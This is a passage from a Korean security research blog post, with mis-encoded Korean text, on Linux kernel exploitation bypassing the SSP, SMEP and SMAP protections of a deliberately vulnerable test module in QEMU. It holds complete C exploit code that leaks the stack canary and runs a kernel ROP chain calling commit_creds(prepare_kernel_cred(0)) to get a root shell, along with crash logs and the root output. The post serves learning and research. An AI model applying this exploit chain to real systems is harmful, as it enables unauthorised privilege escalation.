<p>ë˜í•œ ìœ„ì—ì„œëŠ” ì œì‹œí•˜ì§€ ì•Šì•˜ì§€ë§Œ ì´ì „ í¬ìŠ¤íŠ¸ì—ì„œ ì œì‹œí•˜ì˜€ë˜ ë°©ë²•ê³¼ ë™ì¼í•˜ê²Œ return addressë¥¼ í™•ì¸í•´ë³¸ ê²°ê³¼ ë²„í¼ì—ì„œ 40ë°”ì´íŠ¸ ë–¨ì–´ì§„ ê³³ì´ return addressë¡œ íŒë‹¨ëœë‹¤.</p>
</br>

<h3 id="ê³µê²©-ì½”ë“œ-2"><a href="#ê³µê²©-ì½”ë“œ-2" class="headerlink" title="ê³µê²© ì½”ë“œ(2)"></a>ê³µê²© ì½”ë“œ(2)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>int main() &#123;<br>    int fd;<br>    size_t *canary[6] = &#123;0, &#125;;<br>    size_t payload[20] = &#123;0, &#125;;<br><br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br><br>    // STEP1. Leak Stack Canary<br>    read(fd, canary, sizeof(canary));<br>    <br>    printf(&quot;canary[0] = %lx\n&quot;, canary[0]);<br>    printf(&quot;canary[1] = %lx\n&quot;, canary[1]);<br>    printf(&quot;canary[2] = %lx\n&quot;, canary[2]);<br>    printf(&quot;canary[3] = %lx\n&quot;, canary[3]);<br>    printf(&quot;canary[4] = %lx\n&quot;, canary[4]);<br>    printf(&quot;canary[5] = %lx\n&quot;, canary[5]);<br><br><br>    // STEP2. Corrupt Stack Memory<br>    payload[0] = canary[1];<br>    payload[1] = canary[1];<br>    payload[2] = canary[1];<br>    payload[3] = canary[1];<br>    payload[4] = canary[1];<br>    payload[5] = 0x4343434343434343;<br><br>    write(fd, payload, sizeof(payload));<br><br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="ê³µê²©-ê²°ê³¼-2"><a href="#ê³µê²©-ê²°ê³¼-2" class="headerlink" title="ê³µê²© ê²°ê³¼(2)"></a>ê³µê²© ê²°ê³¼(2)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ ./crash 
canary[0] = 0
canary[1] = 77aa91d07abac300
canary[2] = 30
canary[3] = 1
canary[4] = ffffffff811e311b
canary[5] = ffff88801d9ec300
[    3.942545] arr : 0
[    3.942953] general protection fault: 0000 [#1] SMP NOPTI
[    3.944977] CPU: 0 PID: 70 Comm: crash Tainted: G           O      5.8.5 #1
[    3.946180] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[    3.948119] RIP: 0010:0x4343434343434343
[    3.949110] Code: Bad RIP value.
[    3.955544] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000286
[    3.955840] RAX: 0000000000000000 RBX: 77aa91d07abac300 RCX: 0000000000000000
[    3.956295] RDX: 0000000000000000 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0
[    3.956783] RBP: 77aa91d07abac300 R08: 0000000030203a20 R09: 0000000000000007
[    3.957227] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 77aa91d07abac300
[    3.957691] R13: 00000000000000a0 R14: ffffc9000019ff10 R15: 00007ffdbbfb26a0
[    3.958258] FS:  000000000168b880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000
[    3.958848] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    3.960591] CR2: 000000000168db28 CR3: 000000001da40000 CR4: 00000000003006f0
[    3.961172] Call Trace:
[    3.962152]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
[    3.964479] Modules linked in: test(O)
[    3.965730] ---[ end trace e9e73822d90c8f9d ]---
[    3.967058] RIP: 0010:0x4343434343434343
[    3.967454] Code: Bad RIP value.
[    3.967779] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000286
[    3.968107] RAX: 0000000000000000 RBX: 77aa91d07abac300 RCX: 0000000000000000
[    3.968623] RDX: 0000000000000000 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0
[    3.969116] RBP: 77aa91d07abac300 R08: 0000000030203a20 R09: 0000000000000007
[    3.969657] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 77aa91d07abac300
[    3.970123] R13: 00000000000000a0 R14: ffffc9000019ff10 R15: 00007ffdbbfb26a0
[    3.970625] FS:  000000000168b880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000
[    3.971228] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    3.971760] CR2: 000000000168db28 CR3: 000000001da40000 CR4: 00000000003006f0
[    3.972372] Kernel panic - not syncing: Fatal exception
[    3.973145] Kernel Offset: disabled
[    3.973878] Rebooting in 1 seconds..
qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220
This usually means one of the following happened:

(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)
(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end
(3) Your guest kernel has a bug and crashed by jumping off into nowhere

This is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.
If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.

Execution cannot continue; stopping here.
</code></pre>
</br>

<p>ì‘ì„±í•œ ê³µê²©ì½”ë“œë¥¼ í† ëŒ€ë¡œ ê³µê²©ì„ ìˆ˜í–‰í•´ë³¸ ê²°ê³¼ ì˜ë„í•˜ì˜€ë˜ ë°”ì™€ ê°™ì´ ì‹¤í–‰íë¦„ì„ ë‹´ë‹¹í•˜ëŠ” ë ˆì§€ìŠ¤í„° RIPê°€ ë³€ì¡°ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤. ë§Œì•½ ìŠ¤íƒ ì¹´ë‚˜ë¦¬ì˜ ê°’ì´ ì¼ì¹˜í•˜ì§€ ì•Šì•˜ë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœì˜ ì»¤ë„ íŒ¨ë‹‰ì´ ì•„ë‹Œ Stack Smashing Detectedì™€ ê°™ì€ ë‹¤ë¥¸ í˜•íƒœì˜ ì •ë³´ë¥¼ ë³´ì—¬ì£¼ì—ˆì„ ê²ƒì´ë‹¤. ê·¸ëŸ¬ë¯€ë¡œ ì¶”ì¶œí•œ ì¹´ë‚˜ë¦¬ì˜ ê°’ì€ ì •ìƒì ì¸ í˜•íƒœì˜ ì¹´ë‚˜ë¦¬ì´ë©° SSPë¥¼ ìš°íšŒí•˜ì—¬ ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆë‹¤ëŠ” ê²°ë¡ ì„ ë‚´ë ¸ë‹¤.</p>
<p></br></br></p>
<h2 id="ì·¨ì•½ì -ê³µê²©"><a href="#ì·¨ì•½ì -ê³µê²©" class="headerlink" title="ì·¨ì•½ì  ê³µê²©"></a>ì·¨ì•½ì  ê³µê²©</h2><p>ë¶„ì„ê³¼ì •ì„ í†µí•´ ì‚¬ìš©ìì˜ ì…ë ¥(untrusted input)ì„ í†µí•´ ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆìŒì„ í™•ì¸í•˜ì˜€ë‹¤. ì´ëŸ¬í•œ ì •ë³´ë“¤ì„ í† ëŒ€ë¡œ ê³µê²©ìì—ê²Œ ìœ ì˜ë¯¸í•œ í˜•íƒœì˜ ê³µê²©ì´ ë  ìˆ˜ ìˆë„ë¡ ì–´ë– í•œ í˜•íƒœë¡œ ê³µê²©ì„ ì§„í–‰í•  ê²ƒì¸ê°€ì— ëŒ€í•´ì„œ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì‘ì„±í•˜ê² ë‹¤.</p>
<p>ê°€ì¥ íŒŒê¸‰ë ¥ìˆê³  ê³µê²©ìì—ê²Œ ììœ ë„ê°€ ë†’ì€ ë°©ë²•ì€ ë¦¬ëˆ…ìŠ¤(linux) ê¸°ë°˜ì˜ ì»¤ë„ì„ ê³µê²©í•˜ëŠ” ê²ƒì´ê¸°ì— ë£¨íŠ¸ ê¶Œí•œì˜ ì‰˜(shell)ì„ íšë“í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë‹¤. ë‹¤ìŒê³¼ ê°™ì€ ê³µê²©ì´ ì´ë£¨ì–´ì§€ê¸° ìœ„í•´ì„œëŠ” ìš°ì„ ì ìœ¼ë¡œ ì§„í–‰ë˜ì–´ì•¼ í•˜ëŠ” ê²ƒì´ ìœ ì € ê¶Œí•œì„ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ìƒìŠ¹(ê¶Œí•œ ìƒìŠ¹)ì„ ì¼ìœ¼ì¼œì•¼ í•œë‹¤. </p>
</br>

<h3 id="ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤"><a href="#ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤" class="headerlink" title="ê³µê²© ì‹œë‚˜ë¦¬ì˜¤"></a>ê³µê²© ì‹œë‚˜ë¦¬ì˜¤</h3><pre><code>STEP1. stack canary ìœ ì¶œ(leak) 
STEP2. commit_creds(prepare_kernel_cred(0))ì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹
STEP3. ì‚¬ìš©ì ëª¨ë“œ(user mode)ë¡œì˜ ì „í™˜
STEP4. shell íšë“
</code></pre>
<p>í•´ë‹¹ ì‹œë‚˜ë¦¬ì˜¤ì˜ ê²½ìš° ì§€ê¸ˆê¹Œì§€ ì‘ì„±í•´ì™”ë˜ ì¼ë°˜ì ì¸ ìµìŠ¤í”Œë¡œì‡ê³¼ ìœ ì‚¬í•˜ë‹¤. SMEP, SMAPì´ ì ìš©ë˜ì–´ ìˆìœ¼ë¯€ë¡œ ì‹œë‚˜ë¦¬ì˜¤ì— í•´ë‹¹í•˜ëŠ” í˜ì´ë¡œë“œë¥¼ Kernel ROPë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•˜ì—¬ ì§„í–‰í•˜ë©° SSPê°€ ì ìš©ë˜ì–´ ìˆìœ¼ë¯€ë¡œ stack canaryì˜ ê°’ì„ ê³ ë ¤í•˜ì—¬ ê³µê²©ì„ ìˆ˜í–‰í•˜ì—¬ì•¼ í•œë‹¤. ê·¸ëŸ¬ë¯€ë¡œ ìš°ì„ ì ìœ¼ë¡œ STEP1ì— í•´ë‹¹í•˜ëŠ” leakì„ ë¨¼ì € ìˆ˜í–‰í•˜ì—¬ í•´ë‹¹ ê°’ì„ í† ëŒ€ë¡œ í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•´ì•¼ í•œë‹¤.</p>
</br>


<h3 id="ê°€ì ¯-êµ¬ì„±"><a href="#ê°€ì ¯-êµ¬ì„±" class="headerlink" title="ê°€ì ¯ êµ¬ì„±"></a>ê°€ì ¯ êµ¬ì„±</h3><p>ê°€ì ¯ êµ¬ì„±ì˜ ê²½ìš° <a target="_blank" rel="noopener" href="https://gaegaegae.github.io/2021/09/30/linux-kernel-exploit-bypassing-smep//#ê°€ì ¯-êµ¬ì„±">Bypassing SMEP</a>ì— ì‘ì„±í•œ í˜•íƒœì™€ ë™ì¼í•˜ê¸°ì— í•´ë‹¹ ê³¼ì •ì˜ ê¸°ì¬ëŠ” ìƒëµí•˜ë„ë¡ í•˜ê² ë‹¤.</p>
</br>

<h3 id="ê°€ì ¯-ì¶”ì¶œ"><a href="#ê°€ì ¯-ì¶”ì¶œ" class="headerlink" title="ê°€ì ¯ ì¶”ì¶œ"></a>ê°€ì ¯ ì¶”ì¶œ</h3><p>ê°€ì ¯ ì¶”ì¶œì˜ ê²½ìš° <a target="_blank" rel="noopener" href="https://gaegaegae.github.io/2021/09/30/linux-kernel-exploit-bypassing-smep//#ê°€ì ¯-ì¶”ì¶œ">Bypassing SMEP</a>ì— ì‘ì„±í•œ í˜•íƒœì™€ ë™ì¼í•˜ê¸°ì— í•´ë‹¹ ê³¼ì •ì˜ ê¸°ì¬ëŠ” ìƒëµí•˜ë„ë¡ í•˜ê² ë‹¤.</p>
</br>

<h3 id="ê³µê²©ì½”ë“œ"><a href="#ê³µê²©ì½”ë“œ" class="headerlink" title="ê³µê²©ì½”ë“œ"></a>ê³µê²©ì½”ë“œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>&#125;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t payload[20] = &#123;0, &#125;;<br>    size_t *canary[2] = &#123;0, &#125;;<br>    int i = 0;<br>    <br>    void *commit_creds = 0xffffffff8108e9f0;<br>    void *prepare_kernel_cred = 0xffffffff8108ec20;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    read(fd, canary, sizeof(canary));<br>    printf(&quot;canary = %lx\n&quot;, canary[1]);<br><br>    backup_rv();<br><br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = 0xffffffff813fb9bc;    // pop rdi; ret;<br>    payload[i++] = 0;<br>    payload[i++] = prepare_kernel_cred;<br>    payload[i++] = 0xffffffff813f4eca;    // pop rcx; ret;<br>    payload[i++] = 0;<br>    payload[i++] = 0xffffffff81b2413b;    // mov rdi, rax; rep movs ...; ret;<br>    payload[i++] = commit_creds;<br>    payload[i++] = 0xffffffff81c00f58;    // swapgs; ret;<br>    payload[i++] = 0xffffffff810252b2;    // iretq; ret;<br>    payload[i++] = &amp;shell;<br>    payload[i++] = rv.user_cs;<br>    payload[i++] = rv.user_rflags;<br>    payload[i++] = rv.user_rsp;<br>    payload[i++] = rv.user_ss;<br><br>    write(fd, payload, sizeof(payload));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<h3 id="ê³µê²©ê²°ê³¼"><a href="#ê³µê²©ê²°ê³¼" class="headerlink" title="ê³µê²©ê²°ê³¼"></a>ê³µê²©ê²°ê³¼</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ whoami
user
/ $ ./exploit 
canary = c6fd32469a343500
/ # whoami
root
/ # 
</code></pre>
<p></br></br></p>
<h2 id="ì°¸ê³ "><a href="#ì°¸ê³ " class="headerlink" title="ì°¸ê³ "></a>ì°¸ê³ </h2><pre><code>b30w0lfë‹˜ì˜ ìš´ì˜ì²´ì œ(Operating System)
DREAMHACK - Linux Kernel Exploit
INFLEARN - ë¦¬ëˆ…ìŠ¤ ì»¤ë„ í•´í‚¹. Aë¶€í„° Zê¹Œì§€
https://www.lazenca.net/pages/viewpage.action?pageId=25624859
https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame
</code></pre>
<p></br></br></p>
<h2 id="í•œì¤„í‰"><a href="#í•œì¤„í‰" class="headerlink" title="í•œì¤„í‰"></a>í•œì¤„í‰</h2><pre><code>ğŸ—¡ï¸ âŒ ğŸ›¡ï¸
</code></pre>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/Research/">Research</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/exploit/">exploit</a>
                    
                      <a class="hover-with-bg" href="/tags/linux/">linux</a>
                    
                      <a class="hover-with-bg" href="/tags/kernel/">kernel</a>
                    
                      <a class="hover-with-bg" href="/tags/mitigation/">mitigation</a>
                    
                      <a class="hover-with-bg" href="/tags/smep/">smep</a>
                    
                      <a class="hover-with-bg" href="/tags/smap/">smap</a>
                    
                      <a class="hover-with-bg" href="/tags/ssp/">ssp</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/10/04/linux-kernel-exploit-kpti/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">[Research] Linux Kernel Exploit - KPTI</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/10/02/linux-kernel-exploit-bypassing-smap/">
                        <span class="hidden-mobile">[Research] Linux Kernel Exploit - Bypassing SMAP</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>















<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>


</body>
</html>
